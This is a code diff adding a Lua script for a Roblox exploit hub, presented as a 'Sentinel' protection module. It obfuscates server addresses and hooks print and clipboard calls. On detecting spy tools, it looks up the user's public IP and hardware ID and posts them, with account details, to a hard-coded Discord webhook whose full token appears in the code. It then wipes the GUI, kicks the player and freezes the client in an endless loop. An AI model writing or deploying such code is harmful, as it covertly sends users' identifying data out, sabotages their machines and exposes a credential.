@@ -1,1 +1,148 @@
 
+--[[ 
+    TEDDY HUB SENTINEL V4 - LIGHTWEIGHT PROTECTION
+    Authorized User: Teddy
+    Status: Optimized & Internationalized
+]]
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local player = Players.LocalPlayer
+
+local function d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
+
+local URL_KEY_1 = d({110,105,103,104,116,104,117,98,46,115,105,116,101}) -- nighthub.site
+local URL_KEY_2 = d({49,54,48,46,49,56,55,46,50,52,54,46,56,58,49,50,48,57}) -- 160.187.246.8:1209
+local WEBHOOK = "https://discord.com/api/webhooks/1474769654378528890/KaL0m6edEpRSD2YQp4kaKjPV0MGfgE4QfHa7MXH4cG3lgtej8Sm6EEY1_Jhy-QtK_Bj3"
+local DATA_FILE = "teddy_hub_v4_lite.json"
+
+local function getLog()
+    if isfile and isfile(DATA_FILE) then
+        local s, r = pcall(function() return HttpService:JSONDecode(readfile(DATA_FILE)) end)
+        if s then return r end
+    end
+    return {s = 0, t = 0, b = 0}
+end
+
+local function saveLog(t) if writefile then writefile(DATA_FILE, HttpService:JSONEncode(t)) end end
+
+local function ExecuteNuke(reason)
+    local log = getLog()
+    local now = os.time()
+    
+    log.s = log.s + 1
+    log.t = now
+    
+    local banned = false
+    if log.s >= 4 then
+        log.b = now + 86400 
+        banned = true
+    end
+    saveLog(log)
+
+    task.spawn(function()
+        local ip = "N/A"
+        pcall(function() ip = game:HttpGet("https://api.ipify.org") end)
+        local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+        
+        if request then
+            request({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({
+                    ["embeds"] = {{
+                        ["title"] = banned and "🚫 IP BAN ACTIVATED" or "⚠️ SPY ATTEMPT DETECTED",
+                        ["color"] = banned and 16711680 or 16753920,
+                        ["fields"] = {
+                            {["name"] = "Account", ["value"] = player.Name .. " (" .. player.UserId .. ")", ["inline"] = true},
+                            {["name"] = "Network Info", ["value"] = "IP: " .. ip .. "\nHWID: " .. hwid, ["inline"] = true},
+                            {["name"] = "Violation", ["value"] = log.s .. "/4", ["inline"] = true},
+                            {["name"] = "Reason", ["value"] = reason, ["inline"] = false}
+                        },
+                        ["footer"] = {["text"] = "TEDDY Hub Security System • " .. os.date("%c")}
+                    }}
+                })
+            })
+        end
+    end)
+
+    pcall(function()
+        if gethui then gethui():ClearAllChildren() end
+        if CoreGui then CoreGui:ClearAllChildren() end
+        player.PlayerGui:ClearAllChildren()
+        
+        local sg = Instance.new("ScreenGui", CoreGui or player.PlayerGui)
+        sg.DisplayOrder = 2147483647
+        local f = Instance.new("Frame", sg)
+        f.Size = UDim2.new(10, 0, 10, 0)
+        f.BackgroundColor3 = Color3.new(0,0,0)
+        f.ZIndex = 2147483647
+        
+        RunService.RenderStepped:Connect(function()
+            print("🛡️ TEDDY HUB: DATA PROTECTION ACTIVE!")
+            warn("UNAUTHORIZED API ACCESS DETECTED.")
+            if rconsoleprint then rconsoleprint("!!! SECURITY BREACH ATTEMPT !!!\n") end
+        end)
+    end)
+
+    task.wait(0.6)
+    local statusText = banned and "BANNED (24H)" or "KICKED"
+    player:Kick("\n🛡️ TEDDY HUB SECURITY 🛡️\n\nStatus: " .. statusText .. "\nViolation: " .. log.s .. "/4\nReason: " .. reason .. "\n\nYour network identity has been logged.")
+    while true do end
+end
+
+local function isSecret(t)
+    local s = tostring(t):lower()
+    if #s > 10 and #s < 1000 then 
+        return s:find(URL_KEY_1) or s:find(URL_KEY_2)
+    end
+    return false
+end
+
+local function onChildAdded(obj)
+    local n = obj.Name:lower()
+    if n:find("spy") or n:find("hydroxide") or n:find("http") or n:find("logger") then
+        ExecuteNuke("Spy Tool UI Detected: " .. obj.Name)
+    end
+end
+
+CoreGui.ChildAdded:Connect(onChildAdded)
+if gethui then gethui().ChildAdded:Connect(onChildAdded) end
+
+if hookfunction then
+    local op; op = hookfunction(print, function(...)
+        local a = {...}
+        if isSecret(a[1]) then ExecuteNuke("Sensitive Data Leak (Print)") end
+        return op(...)
+    end)
+
+    local osb; osb = hookfunction(setclipboard or toclipboard, function(t)
+        if isSecret(t) then ExecuteNuke("Sensitive Data Leak (Clipboard)") end
+        return osb(t)
+    end)
+end
+local sd = getLog()
+local now = os.time()
+
+if sd.b > now then
+    local hoursLeft = math.ceil((sd.b - now) / 3600)
+    player:Kick("🚫 Access Denied: You are currently banned from TEDDY Hub. Expires in: " .. hoursLeft .. " hours.")
+    return
+elseif sd.b > 0 and now >= sd.b then
+    sd.s = 0; sd.b = 0; saveLog(sd)
+elseif sd.s > 0 and (now - sd.t >= 86400) then
+    sd.s = 0; saveLog(sd)
+end
+
+task.spawn(function()
+    while task.wait(20) do
+        if not iscclosure(print) or not iscclosure(setclipboard) then
+            ExecuteNuke("Environment Tampering Detected")
+        end
+    end
+end)
+
+print("🛡️ TEDDY Hub Sentinel V4 (Lite) Loaded.")
